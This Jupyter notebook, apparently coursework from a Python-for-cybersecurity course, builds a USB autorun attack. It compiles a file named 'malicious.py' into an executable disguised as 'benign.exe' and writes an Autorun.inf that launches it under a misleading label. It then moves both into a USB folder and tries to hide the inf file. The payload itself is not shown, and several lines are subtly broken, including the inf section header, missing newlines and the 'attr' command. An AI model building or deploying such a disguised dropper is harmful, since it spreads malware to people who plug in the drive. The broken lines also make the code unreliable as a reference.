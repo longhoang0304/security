{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "initial_id",
   "metadata": {
    "collapsed": true,
    "ExecuteTime": {
     "end_time": "2023-10-26T11:39:59.645453200Z",
     "start_time": "2023-10-26T11:39:59.631362500Z"
    }
   },
   "outputs": [],
   "source": [
    "import PyInstaller.__main__\n",
    "import shutil\n",
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "outputs": [],
   "source": [
    "filename = \"malicious.py\"\n",
    "exename = \"benign.exe\"\n",
    "pwd = os.getcwd()\n",
    "usbdir = os.path.join(pwd, \"USB\")\n",
    "autorun = \"Autorun.inf\""
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2023-10-26T11:39:59.647452100Z",
     "start_time": "2023-10-26T11:39:59.638882700Z"
    }
   },
   "id": "4014391c45bb2b2f"
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "outputs": [],
   "source": [
    "if os.path.isfile(exename):\n",
    "    os.remove(exename)\n",
    "\n",
    "if not os.path.exists(usbdir):\n",
    "    os.makedirs(usbdir)"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2023-10-26T11:39:59.705317700Z",
     "start_time": "2023-10-26T11:39:59.648964800Z"
    }
   },
   "id": "e15b8010905010b7"
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Creating exe\n",
      "EXE Created\n"
     ]
    }
   ],
   "source": [
    "# generate malware\n",
    "print(\"Creating exe\")\n",
    "\n",
    "PyInstaller.__main__.run([\n",
    "    \"malicious.py\",\n",
    "    \"--onefile\",\n",
    "    \"--clean\",\n",
    "    \"--log-level=ERROR\",\n",
    "    f\"--name={exename}\",\n",
    "])\n",
    "\n",
    "print(\"EXE Created\")"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2023-10-26T11:40:13.515524200Z",
     "start_time": "2023-10-26T11:39:59.661629Z"
    }
   },
   "id": "760d8338946c1f1f"
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Creating Autorun file\n"
     ]
    }
   ],
   "source": [
    "# clean up\n",
    "shutil.move(os.path.join(pwd, \"dist\", exename), pwd)\n",
    "shutil.rmtree(\"dist\")\n",
    "shutil.rmtree(\"build\")\n",
    "# shutil.rmtree(\"__pycache__\")\n",
    "os.remove(f\"{exename}.spec\")\n",
    "\n",
    "print(\"Creating Autorun file\")"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2023-10-26T11:40:13.529492600Z",
     "start_time": "2023-10-26T11:40:13.511524700Z"
    }
   },
   "id": "61915a022141b380"
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Setting up USB\n"
     ]
    }
   ],
   "source": [
    "# create autorun file\n",
    "with open(autorun, \"w\") as f:\n",
    "    f.writelines([\n",
    "        \"(Autorun)\\n\",\n",
    "        f\"Open={exename}\\n\",\n",
    "        \"Action=Start Firefox Portable\\n\"\n",
    "        \"Label=My USB\\n\"\n",
    "        f\"Icon=${exename}\\n\"\n",
    "    ])\n",
    "\n",
    "print(\"Setting up USB\")"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2023-10-26T11:40:13.597297500Z",
     "start_time": "2023-10-26T11:40:13.529492600Z"
    }
   },
   "id": "17ae08a0da84ea24"
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "attr +h \"D:\\Code\\security\\Coursera\\Python for Cybersecurity Specialization\\Week 3\\Autorun scripts\\USB\\Autorun.inf\"\n"
     ]
    },
    {
     "data": {
      "text/plain": "1"
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Move autorun file to USB and set to hidden\n",
    "shutil.move(exename, usbdir)\n",
    "shutil.move(autorun, usbdir)\n",
    "hide_cmd = f\"attr +h \\\"{os.path.join(usbdir, autorun)}\\\"\"\n",
    "\n",
    "print(hide_cmd)\n",
    "\n",
    "os.system(hide_cmd)"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2023-10-26T11:40:51.009186900Z",
     "start_time": "2023-10-26T11:40:50.955353400Z"
    }
   },
   "id": "4c158b8a1b157aa"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [],
   "metadata": {
    "collapsed": false
   },
   "id": "a13f2da688d85efe"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
